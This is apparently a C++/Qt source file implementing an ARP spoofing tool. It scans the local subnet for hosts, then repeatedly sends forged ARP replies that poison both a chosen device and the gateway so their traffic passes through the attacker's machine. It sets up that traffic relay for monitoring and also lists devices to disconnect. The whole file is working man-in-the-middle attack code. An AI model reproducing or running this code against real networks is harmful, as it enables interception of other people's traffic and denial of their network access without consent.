#include "ArpBusiness.h"
#include "Arp.h"
#include <QDebug>
#include"../NetTransmit/NetTransmit.h"

//void createcharip(const QString &ipstr, char *str)
//{
//
//	if (ipstr != "")
//	{
//		sscanf(ipstr.toLocal8Bit().data(), "%d.%d.%d.%d", &str[0], &str[1], &str[2], &str[3]);
//	}
//
//}

//void createcharmac(const QString & macip, char *str)
//{
//	if (macip != "")
//	{
//		sscanf(macip.toLocal8Bit().data(), "%x:%x:%x:%x:%x:%x", &str[0], &str[1], &str[2], &str[3], &str[4], &str[5]);
//	}
//}


bool macStrToByte(QByteArray& marray, const QString& str)
{
	marray.clear();
	QStringList maclist = str.split(':');
	for (size_t i = 0; i < maclist.size(); i++)
	{
		bool ok;
		int hexnum = maclist[i].toInt(&ok, 16);
		marray.push_back(hexnum);
	}
	return true;
}

bool ipStrToByte(QByteArray& marray, const QString& str)
{
	marray.clear();
	QStringList maclist = str.split('.');
	for (size_t i = 0; i < maclist.size(); i++)
	{
		bool ok;
		int hexnum = maclist[i].toInt(&ok, 10);
		marray.push_back(hexnum);
	}
	return true;
}

QString getThreeIp(const QString &ip)
{
	QStringList iplist = ip.split('.');
	if (iplist.count() == 4)
	{
		return iplist.at(0) + "." + iplist.at(1) + "." + iplist.at(2) + ".";
	}
	return "";
}
ArpBusiness::ArpBusiness() :isStop(false), isInit(false)
{

}

ArpBusiness::~ArpBusiness()
{
	isStop = true;
}

ArpBusiness &ArpBusiness::Instance()
{
	static ArpBusiness mArpBusiness;
	return mArpBusiness;
    // TODO: 在此处插入 return 语句
}

void ArpBusiness::init()
{
	if (isInit)
	{
		return;
	}	
	mNetmanager = XuNetInterfaceManager::Instance();
	if(mNetmanager)
	{
		mNetmanager->init();
		mNetmanager->attch(this,std::bind(&ArpBusiness::receiveData,this,std::placeholders::_1));
	}
	NetTransmit::Instance().init();
	start();
	isInit = true;
}

void ArpBusiness::run()
{
	while (!isStop)
	{
		if (!mDeceiveHash.isEmpty())
		{
			QHash<QString, ArpPack>::iterator iter = mDeceiveHash.begin();
			while (iter != mDeceiveHash.end())
			{
				ArpPack& tmpPck = iter.value();
				std::shared_ptr<QByteArray> arpdata = Arp::Instance().createPack(tmpPck);
				mNetmanager->send((unsigned char*)arpdata->data(), arpdata->size());
				iter++;
			}
		}
		QThread::sleep(1);
	}
}

 void ArpBusiness::addDeceive(const QString &ip,const ArpPack&info)
 {
	 mDeceiveHash.insert(ip,info);
 }

 void ArpBusiness::deleteDeceive(const QString& ip)
 {
 	if (mDeceiveHash.contains(ip))
 	{
		mDeceiveHash.remove(ip);
 	}
 }

void ArpBusiness::addDisconnectNet(const QString& ip)
{
    if(!mDiconnectNetList.contains(ip))
    {
        mDiconnectNetList.push_back(ip);
    }
}

void ArpBusiness::deleteDisconnectNet(const QString& ip)
{
    if (mDiconnectNetList.contains(ip))
    {
        mDiconnectNetList.removeOne(ip);
    }
}

void ArpBusiness::addOnitor(const QString& ip)
{
	if (!mOnitorList.contains(ip) && mDeviceInfo.contains(ip))
	{
		NetInterfaceInfo mNetinfo = XuNetInterfaceManager::Instance()->getCurNetfaceInfo();
		if (!mDeviceInfo.contains(mNetinfo.gateway))
		{
			return;
		}
		mOnitorList.push_back(ip);
		
		//骗设备
		ArpPack arpPack;
		macStrToByte(arpPack.disMac, mDeviceInfo[ip]);
		macStrToByte(arpPack.surMac, mNetinfo.mac);
		arpPack.type = 2;
		macStrToByte(arpPack.sendMac, mNetinfo.mac);
		ipStrToByte(arpPack.sendIp ,mNetinfo.gateway);//告诉设备 我的mac地址 ip是网关
		macStrToByte(arpPack.targetMac, mDeviceInfo[ip]);
		ipStrToByte(arpPack.targetIp, ip);

		addDeceive(ip, arpPack);

		//骗网关
		ArpPack arpPack1;
		macStrToByte(arpPack1.disMac, mDeviceInfo[mNetinfo.gateway]);
		macStrToByte(arpPack1.surMac, mNetinfo.mac);
		arpPack1.type = 2;
		macStrToByte(arpPack1.sendMac, mNetinfo.mac);
		ipStrToByte(arpPack1.sendIp,ip);//告诉网关 我的mac地址  ip是要监听的设备
		macStrToByte(arpPack1.targetMac, mDeviceInfo[mNetinfo.gateway]);
		ipStrToByte(arpPack1.targetIp, mNetinfo.gateway);

		addDeceive(mNetinfo.gateway, arpPack1);

		//流量转发
		TransmitInfo transmitInfo;
		macStrToByte(transmitInfo.devMac, mDeviceInfo[ip]);
		macStrToByte(transmitInfo.gatewayMac, mDeviceInfo[mNetinfo.gateway]);
		macStrToByte(transmitInfo.mMac, mNetinfo.mac);
		ipStrToByte(transmitInfo.devIP, ip);
		ipStrToByte(transmitInfo.mIP, mNetinfo.ip);
		NetTransmit::Instance().addTransmitDev(transmitInfo);
	}
}

void ArpBusiness::deleteOnitor(const QString& ip)
{
	if (mOnitorList.contains(ip))
	{
		mOnitorList.removeOne(ip);
		mDeceiveHash.remove(ip);
	}
}

void ArpBusiness::broadcast()
{
	NetInterfaceInfo tmpinfo = XuNetInterfaceManager::Instance()->getCurNetfaceInfo();
	ArpPack tmpPck = {0};
	for (size_t i = 0; i < 6; i++)
	{
		tmpPck.disMac.push_back(0XFF);
		tmpPck.targetMac.push_back(char(0));
	}
	ipStrToByte(tmpPck.sendIp, tmpinfo.ip);
	macStrToByte(tmpPck.surMac, tmpinfo.mac);
	macStrToByte(tmpPck.sendMac, tmpinfo.mac);
	tmpPck.type = 1;
	for (int i = 1; i <= 255; i++)
	{
		QString tmptargetIp = getThreeIp(tmpinfo.ip) + QString::number(i);
		ipStrToByte(tmpPck.targetIp, tmptargetIp);
		std::shared_ptr<QByteArray> arpdata = Arp::Instance().createPack(tmpPck);
		mNetmanager->send((unsigned char *)arpdata->data(),arpdata->size());
		QThread::msleep(2);
	}
}

bool ArpBusiness::receiveData(std::shared_ptr<QByteArray> data)
{
	if (data->size() == 42)
	{
		if ((data->at(12) == (char)0X08) &&
			(data->at(13) == (char)0X06) &&
			(data->at(21) == (char)0X02)
			)
		{
			QByteArray macArray = data->mid(22, 6);
			QByteArray ipArray = data->mid(28, 4);
			QString ip = QString("%1.%2.%3.%4").arg(QString::number((unsigned char)ipArray[0])).arg(QString::number((unsigned char)ipArray[1])).arg(QString::number((unsigned char)ipArray[2])).arg(QString::number((unsigned char)ipArray[3]));
			QString mac = QString("%1:%2:%3:%4:%5:%6").arg(QString::number((unsigned char)macArray[0],16)).arg(QString::number((unsigned char)macArray[1],16)).arg(QString::number((unsigned char)macArray[2],16)).arg(QString::number((unsigned char)macArray[3],16)).arg(QString::number((unsigned char)macArray[4],16)).arg(QString::number((unsigned char)macArray[5],16));
			if(!mDeviceInfo.contains(ip))
			{
				mDeviceInfo.insert(ip,mac);
			}
			emit findDevice(ip,mac);
		}
	}
    return true;
}
